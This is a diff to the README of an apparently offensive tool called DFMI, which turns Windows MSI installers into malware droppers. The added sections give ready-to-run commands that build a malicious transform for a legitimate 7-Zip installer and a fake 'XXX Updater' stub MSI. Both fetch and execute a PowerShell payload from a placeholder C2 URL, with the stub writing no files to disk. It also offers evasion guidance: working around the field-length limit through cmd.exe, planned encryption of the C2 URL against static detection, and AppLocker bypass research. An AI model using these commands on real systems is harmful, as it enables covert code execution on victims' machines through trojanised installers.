@@ -226,11 +226,69 @@ Get-ChildItem -Path "C:\" -Filter "<MALWARE>" -Recurse -File -ErrorAction Silent
 
 #### Using **"Module 2 - ``rogue-mst``"**:
 
+Building malicious MST file:
 
+```powershell
+python.exe .\dfmi.py rogue-mst build .\7z-original.msi evil.mst --c2 http://<C2>/payload.ps1
+```
+
+<p align="center"> <img src="src/8_module2.png" /> </p>
+
+Installing legitimate ``.msi`` installer using malicious TRANSFORM file:
+
+```powershell
+msiexec /i "7z-original.msi" TRANSFORMS="evil.mst"
+```
+<p align="center"> <img src="src/9_c2comm.png" /> </p>
+
+<p align="center"> <img src="src/10_module2_exec.png" /> </p>
 
 ---
 
+#### Using **"Module 3 - ``stub``"**:
 
+Building the ``.msi`` file from scratch:
+
+```powershell
+python.exe .\dfmi.py stub --c2 http://<C2>/payload.ps1 -o stub-test.msi --name "XXX Updater" --manufacturer "XXX Corp"
+```
+
+<p align="center"> <img src="src/11_module3.png" /> </p>
+
+Impersonating installation (no files are written on the disk):
+
+```powershell
+msiexec /i "stub-test.msi"
+```
+
+<p align="center"> <img src="src/12_module3_exec.png" /> </p>
+
+<p align="center"> <img src="src/13_c2comm.png" /> </p>
+
+Result:
+
+<p align="center"> <img src="src/14_module3_result.png" /> </p>
+
+---
+
+## 🚧 Limitations 
+
+- **Authenticode signatures:** The `inject` module invalidates the original MSI's digital signature. Windows SmartScreen or application control policies may flag this. Use `rogue-mst` when signature preservation is required.
+- **Unsigned transforms:** The `.mst` file produced by `rogue-mst` is unsigned. Environments with strict MST validation policies (`MsiDisableEmbeddedUI`, `SafeForScripting`) may restrict unsigned transforms.
+- **Unsigned stubs:** The `stub` module produces an unsigned MSI. This is only a concern in environments that enforce code signing at the MSI level via AppLocker, SRP, or similar.
+- **255-character Target field:** The MSI `CustomAction` table's `Target` column is defined as `CHAR(255)`. The base64-encoded PowerShell command for PS mode consumes approximately 300 characters including the wrapper, which exceeds this limit. DFMI works around this by using `cmd.exe` as the CA executable (via a property) and placing the full PowerShell invocation in the `Target` field as a cmd argument — the 255-char limit applies to the Target string, but cmd is lenient about long argument strings in practice. Tested successfully on Windows 10 and 11.
+- **`rogue-mst` requires Windows:** As explained above, MST generation depends on the Windows Installer COM API. There is no cross-platform alternative at this time.
+- **No AMSI/ETW bypass:** DFMI delivers the payload but does not bypass endpoint security on the target. If the payload triggers AMSI or is flagged by AV, DFMI itself will not help. Use an appropriate loader or obfuscated payload.
+- **No persistence:** DFMI executes the payload once during installation. If the MSI is rolled back immediately after (artifact-free chain), the CA fires once and leaves no persistence mechanism. Persistence must be handled by the payload itself.
+
+---
+
+## 🦖 Roadmap
+
+- **`inject` MST output mode:** Allow `inject` to optionally output a `.mst` instead of a modified MSI, bridging the Linux gap for `rogue-mst`
+- **Payload encryption:** Encrypt the C2 URL and decode it at runtime inside the CA to avoid static string detection in the MSI database.
+- **AppLocker bypass research:** Explore whether MSI execution under `msiexec.exe` inherits the AppLocker whitelist context, and whether this can be leveraged to bypass application control in specific configurations
+- **Linux MST generation:** Investigate producing valid MST files on Linux by manually constructing the OLE Compound Document structure, eliminating the Windows dependency for `rogue-mst`
 
 
 
